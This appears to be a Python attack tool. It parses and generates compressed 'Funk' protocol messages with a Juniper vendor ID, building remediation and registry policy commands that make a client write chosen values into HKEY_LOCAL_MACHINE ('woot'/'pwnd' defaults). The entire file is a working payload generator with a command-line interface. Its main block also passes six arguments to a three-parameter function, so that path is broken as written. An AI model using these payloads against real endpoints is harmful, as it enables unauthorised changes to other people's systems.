from io import BytesIO
import struct
import base64
import logging
import argparse
import zlib
import json
import time

VENDOR_JUNIPER2 = 0x583
MSG_POLICY = 0x58316
MSG_FUNK_PLATFORM = 0x58301
MSG_FUNK = 0xa4c01

class FunkManager:
    def __init__(self):
        self.commands = []

    @staticmethod
    def base64_encode(value):
        return base64.b64encode(value.encode()).decode()

    @staticmethod
    def remediation_command(policy_id='vc0|43|policy_2|1|woot'):
        commands = {
            '0x0ce4': [{ # Encapsulation
                'commands': {},
                'flag1': 0xc0,
                'flag2': 0x00
            }],
            '0x0cf0': [{ # Encapsulation
                'commands': {
                    '0x0cf1': [ # String without hex prefixer
                        {
                            'string': 'test',
                            'flag1': 0xc0,
                            'flag2': 0x00
                        }
                    ],
                    '0x0ce4': [ # Encapsulation
                        {
                            'commands': {
                                '0x0ce7': [
                                    {
                                        'id': MSG_POLICY,
                                        'string': f'REMEDIATE:POLICYID={policy_id},set\x00',
                                        'flag1': 0xc0,
                                        'flag2': 0x00
                                    }
                                ]
                            },
                            'flag1': 0xc0,
                            'flag2': 0x00
                        }
                    ]
                },
                'flag1': 0xc0,
                'flag2': 0x00
            }],
            '0x0012': [{ # seems to be the same as 0xCF3 (unsigned integer)
                'value': 1,
                'flag1': 0xc0,
                'flag2': 0x00
            }],
            '0x0cf3': [{ # Unsigned integer
                'value': 1,
                'flag1': 0x80,
                'flag2': 0x00
            }]
        }
        return commands

    @staticmethod
    def registry_command(rules=None, server_time=False, policy_id='vc0|43|policy_2|1|woot'):
        # If no rules are provided, use a default rule
        if rules is None:
            rules = [{}]

        # If rules is a single dict, wrap it in a list
        if isinstance(rules, dict):
            rules = [rules]

        # Defaults for a rule
        default_rule = {
            'rulename': 'woot',
            'subkey': 'SOFTWARE\\Classes\\abc',
            'regname': 'woot',
            'hive': 'HKEY_LOCAL_MACHINE',
            'value': 'pwnd',
        }

        # Parameter0: always present
        ce7_entries = [{
            'id': MSG_POLICY,
            'string': f'<PARAM NAME="Parameter0" VALUE=";cert_md5=;server_time={int(time.time()) if server_time else 1727187126}">\n\x00',
            'flag1': 0xC0,
            'flag2': 0x00
        }]

        # Add params
        for idx, user_rule in enumerate(rules, 1):
            rule = default_rule.copy()
            rule.update(user_rule)
            reg_type = rule.get('type', 'String')

            # if type is DWORD convert to integer
            if reg_type == 'DWORD':
                rule['value'] = int(rule['value'])
                base64encoded = 0
            else:
                rule['value'] = FunkManager.base64_encode(rule['value'])
                base64encoded = 1

            ce7_entries.append({
                'id': MSG_POLICY,
                'string': f'<param name="parameter{idx}" value="object_number=1; provider=registry; ruleid1={idx-1}; rulename1={rule["rulename"]}; '
                          f'registry_key1={rule["hive"]}; registry_subkey1={rule["subkey"]}; registry_name1={rule["regname"]}; registry_type1={reg_type}; '
                          f'regView641=1; minver1=0; ruleremed=set; needsMonitoring=1; ; policy={policy_id}; '
                          f'registry_value1={rule["value"]}; base64encoded1={base64encoded}">\n'
                          f'<param name="parameter{idx+1}" value="object_number=1; provider=policydata; policy={policy_id}; '
                          f'rulecount=1; expressionIDs=; conditional=0;" >\n\x00',
                'flag1': 0xC0,
                'flag2': 0x00
            })

        commands = {
            "0x0ce4": [{
                "commands": {
                    "0x0ce7": ce7_entries
                },
                "flag1": 0xC0,
                "flag2": 0x00
            }],
            "0x0cf3": [{
                "value": 1,
                "flag1": 0x80,
                "flag2": 0x00
            }]
        }
        return commands

    @staticmethod
    def parse(data):
        """Parse the provided binary data into structured commands."""
        logging.info("Parsing data...")
        decompressed_data = zlib.decompress(data)
        commands = FunkManager._parse_commands(decompressed_data)
        return FunkManager._commands_to_dict(commands)

    @staticmethod
    def pad(data):
        num = 0
        if len(data) & 3:
            num = 4 - (len(data) & 3)
        logging.debug(f'Funk padding: {num}')
        return data + b'\x00' * num

    @staticmethod
    def generate(commands):
        """Generate binary data from structured commands."""
        logging.info("Generating data...")
        serialized_commands = FunkManager._serialize_commands(commands)
        compressed_data = zlib.compress(serialized_commands)
        # Add header
        buf = BytesIO()
        buf.write(0x16.to_bytes(4, 'big'))                              # Zlib compressed data header
        buf.write(b'\xC0')                                              # Flag1
        buf.write(b'\x00')                                              # Flag2
        buf.write((len(compressed_data) + 16).to_bytes(2, 'big'))       # Length of data + header
        buf.write(VENDOR_JUNIPER2.to_bytes(4, 'big'))                   # Vendor
        buf.write(len(serialized_commands).to_bytes(4, 'big'))          # Uncompressed length
        buf.write(compressed_data)
        return FunkManager.pad(buf.getvalue())

    @staticmethod
    def _parse_commands(data):
        commands = []
        buffer = BytesIO(data)

        while buffer.tell() < len(data):
            start = buffer.tell()
            if len(data) - buffer.tell() < 12:
                logging.error(f"Remaining data too small for header at offset {start}")
                break

            # Read the header
            cmd = int.from_bytes(buffer.read(4), "big")
            flag1 = ord(buffer.read(1))                     # Flag
            flag2 = ord(buffer.read(1))                     # Should be 0x00
            length = int.from_bytes(buffer.read(2), "big")  # Length of the command including the header
            reserved = buffer.read(4)                       # Should be 0x583

            assert reserved == VENDOR_JUNIPER2.to_bytes(4, "big")

            # Validate the length field
            if length < 12 or (start + length) > len(data):
                logging.error(
                    f"Invalid length detected at offset {hex(start)}: {length} "
                    f"(remaining: {len(data) - buffer.tell()})"
                )
                break

            logging.debug(
                f"Parsing Command: {cmd:04x}, Flags: {flag1:02x} {flag2:02x}, "
                f"Reserved: {reserved.hex()}, Length: {length}, Offset: {start}"
            )

            # Read the command body
            body = buffer.read(length - 12)
            commands.append((cmd, flag1, flag2, body))

            # Handle padding to the nearest word boundary (4 bytes)
            padding = (4 - (buffer.tell() % 4)) % 4
            if padding > 0:
                padding_bytes = buffer.read(padding)
                if any(padding_bytes):
                    logging.warning(f"Non-null padding detected at offset {buffer.tell() - padding}: {padding_bytes.hex()}")

        return commands

    @staticmethod
    def _commands_to_dict(commands):
        parsed = {}
        for cmd, flag1, flag2, body in commands:
            if cmd == 0x0ce7: # String
                buffer = BytesIO(body)
                id = int.from_bytes(buffer.read(4), "big")
                string = buffer.read().decode('utf-8', errors='replace')
                string_repr = repr(string)
                logging.info(f"Command 0x0ce7: ID={hex(id)}, String={string_repr}")
                parsed.setdefault("0x0ce7", []).append({
                    "id": id, 
                    "string": string,
                    "flag1": flag1,
                    "flag2": flag2
                })
            elif cmd == 0x0cf3: # Unsigned integer
                value = int.from_bytes(body, "big")
                logging.info(f"Command 0x0cf3: Value={value}")
                parsed.setdefault(f"0x0cf3", []).append({
                    "value": value,
                    "flag1": flag1,
                    "flag2": flag2
                })
            elif cmd == 0x0012: # Unsigned integer
                value = int.from_bytes(body, "big")
                logging.info(f"Command 0x0012: Value={value}")
                parsed.setdefault(f"0x0012", []).append({
                    "value": value,
                    "flag1": flag1,
                    "flag2": flag2
                })
            elif cmd == 0x0ce4: # Encapsulation
                nested_commands = FunkManager._parse_commands(body)
                nested_parsed = FunkManager._commands_to_dict(nested_commands)
                logging.info(f"Command 0x0ce4: Encapsulated {nested_parsed}")
                parsed.setdefault("0x0ce4", []).append({
                    "commands": nested_parsed,
                    "flag1": flag1,
                    "flag2": flag2
                })
            elif cmd == 0x0cf0:  # Another type of encapsulation
                nested_commands = FunkManager._parse_commands(body)
                nested_parsed = FunkManager._commands_to_dict(nested_commands)
                logging.info(f"Command 0x0cf0: Encapsulated {nested_parsed}")
                parsed.setdefault("0x0cf0", []).append({
                    "commands": nested_parsed,
                    "flag1": flag1,
                    "flag2": flag2
                })
            elif cmd == 0x0cf1:  # String without hex prefixer
                string = body.decode('utf-8', errors='replace').rstrip('\x00')
                string_repr = repr(string)
                logging.info(f"Command 0x0cf1: String={string_repr}")
                parsed.setdefault("0x0cf1", []).append({
                    "string": string,
                    "flag1": flag1,
                    "flag2": flag2
                })
            else:
                logging.warning(f"Unknown Command 0x{cmd:04x}: Raw Body={body.hex()}")
                parsed.setdefault(f"0x{cmd:04x}", []).append({
                    "body": body,
                    "flag1": flag1,
                    "flag2": flag2
                })
        return parsed

    @staticmethod
    def _serialize_commands(commands):
        """Serialize commands from the parsed dictionary format back to binary."""
        serialized = BytesIO()

        # Handle commands by type from the parsed dictionary format
        for cmd_type, cmd_list in commands.items():
            cmd_num = int(cmd_type, 16)  # Convert hex string (e.g. '0x0ce7') to int

            for cmd_data in cmd_list:
                # Extract flags if present, default to 0x00 if not
                flag1 = cmd_data.get('flag1', 0x00)
                flag2 = cmd_data.get('flag2', 0x00)

                if cmd_num == 0x0ce7:
                    # Handle string command - each command gets its own header
                    body = BytesIO()
                    body.write(cmd_data['id'].to_bytes(4, "big"))
                    string_bytes = cmd_data['string'].encode("utf-8")
                    body.write(string_bytes)
                    body_content = body.getvalue()
                    length = len(body_content) + 12

                    # Write header
                    header = struct.pack(">IBBHI",
                        cmd_num,        # 4 bytes command
                        flag1,          # 1 byte flag1
                        flag2,          # 1 byte flag2
                        length,         # 2 bytes length
                        VENDOR_JUNIPER2 # 4 bytes vendor
                    )
                    serialized.write(header)
                    serialized.write(body_content)

                    # Add padding to nearest word boundary
                    padding = (4 - (serialized.tell() % 4)) % 4
                    if padding > 0:
                        serialized.write(b"\x00" * padding)

                elif cmd_num == 0x0cf3 or cmd_num == 0x0012: # Unsigned integer command
                    value = cmd_data['value'] if isinstance(cmd_data, dict) else cmd_data
                    body_content = value.to_bytes(4, "big")
                    length = len(body_content) + 12

                    # Write header
                    header = struct.pack(">IBBHI",
                        cmd_num,        # 4 bytes command
                        flag1,          # 1 byte flag1
                        flag2,          # 1 byte flag2
                        length,         # 2 bytes length
                        VENDOR_JUNIPER2 # 4 bytes vendor
                    )
                    serialized.write(header)
                    serialized.write(body_content)

                    # Add padding to nearest word boundary
                    padding = (4 - (serialized.tell() % 4)) % 4
                    if padding > 0:
                        serialized.write(b"\x00" * padding)

                elif cmd_num == 0x0ce4: # Encapsulation
                    # Handle nested commands
                    nested_commands = cmd_data.get('commands', cmd_data)
                    nested_data = FunkManager._serialize_commands(nested_commands)
                    length = len(nested_data) + 12

                    # Write single header for all nested commands
                    header = struct.pack(">IBBHI",
                        cmd_num,        # 4 bytes command
                        flag1,          # 1 byte flag1
                        flag2,          # 1 byte flag2
                        length,         # 2 bytes length
                        VENDOR_JUNIPER2 # 4 bytes vendor
                    )
                    serialized.write(header)
                    serialized.write(nested_data)

                    # Add padding to nearest word boundary
                    padding = (4 - (serialized.tell() % 4)) % 4
                    if padding > 0:
                        serialized.write(b"\x00" * padding)
                elif cmd_num == 0x0cf0:  # Another type of encapsulation
                    # Handle nested commands
                    nested_commands = cmd_data.get('commands', cmd_data)
                    nested_data = FunkManager._serialize_commands(nested_commands)
                    length = len(nested_data) + 12

                    # Write header
                    header = struct.pack(">IBBHI",
                        cmd_num,        # 4 bytes command
                        flag1,          # 1 byte flag1
                        flag2,          # 1 byte flag2
                        length,         # 2 bytes length
                        VENDOR_JUNIPER2 # 4 bytes vendor
                    )
                    serialized.write(header)
                    serialized.write(nested_data)

                    # Add padding to nearest word boundary
                    padding = (4 - (serialized.tell() % 4)) % 4
                    if padding > 0:
                        serialized.write(b"\x00" * padding)
                elif cmd_num == 0x0cf1:  # String without hex prefixer
                    string_bytes = cmd_data['string'].encode('utf-8')
                    length = len(string_bytes) + 12

                    # Write header
                    header = struct.pack(">IBBHI",
                        cmd_num,        # 4 bytes command
                        flag1,          # 1 byte flag1
                        flag2,          # 1 byte flag2
                        length,         # 2 bytes length
                        VENDOR_JUNIPER2 # 4 bytes vendor
                    )
                    serialized.write(header)
                    serialized.write(string_bytes)

                    # Add padding to nearest word boundary
                    padding = (4 - (serialized.tell() % 4)) % 4
                    if padding > 0:
                        serialized.write(b"\x00" * padding)

        return serialized.getvalue()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Parse and generate Funk binary data.')
    parser.add_argument('-i', '--input', help='Input binary file to parse')
    parser.add_argument('-o', '--output', help='Output file for generated data')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging')
    parser.add_argument('--output-json', action='store_true', help='Output JSON instead of binary')

    # Command options can be supplied as a JSON file or as command line arguments
    parser.add_argument('-j', '--json', help='JSON file containing the command dictionary')

    # Command line arguments for manual generation
    parser.add_argument('--time', action='store_true', help='Use current time for server_time')
    parser.add_argument('--subkey', help='Subkey for registry command', default='SOFTWARE\\Classes\\abc')
    parser.add_argument('--rulename', help='Rule name for registry command', default='woot')
    parser.add_argument('--regname', help='Registry name for registry command', default='woot')
    parser.add_argument('--policy', help='Policy for policydata command', default='vc0|43|policy_2|1|woot')
    parser.add_argument('--hive', help='Registry hive', default='HKEY_LOCAL_MACHINE')
    parser.add_argument('--value', help='Registry value (will be base64 encoded)', default='pwnd')

    args = parser.parse_args()

    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=log_level)

    # Get commands either from JSON or generate from arguments
    if args.json:
        try:
            with open(args.json, 'r') as f:
                commands = json.load(f)
        except Exception as e:
            logging.error(f"Error loading JSON file: {e}")
            exit(1)
    else:
        # Generate commands from command line arguments
        commands = FunkManager.registry_command(
            args.rulename,
            args.subkey,
            args.regname,
            args.policy,
            args.hive,
            args.value
        )

    # Parse input file if provided
    if args.input:
        try:
            with open(args.input, "rb") as f:
                input_data = f.read()
            parsed_data = FunkManager.parse(input_data)
            logging.info(f"Parsed input data: {parsed_data}")
        except Exception as e:
            logging.error(f"Error parsing input file: {e}")

    # Generate output
    if args.output:
        try:
            if args.output_json:
                # Output the command dictionary as JSON
                with open(args.output, 'w') as f:
                    json.dump(commands, f, indent=4)
            else:
                # Generate binary output
                generated_data = FunkManager.generate(commands)
                with open(args.output, "wb") as f:
                    f.write(generated_data)
            logging.info(f"Generated data written to '{args.output}'")
        except Exception as e:
            logging.error(f"Error generating output file: {e}")
            exit(1)
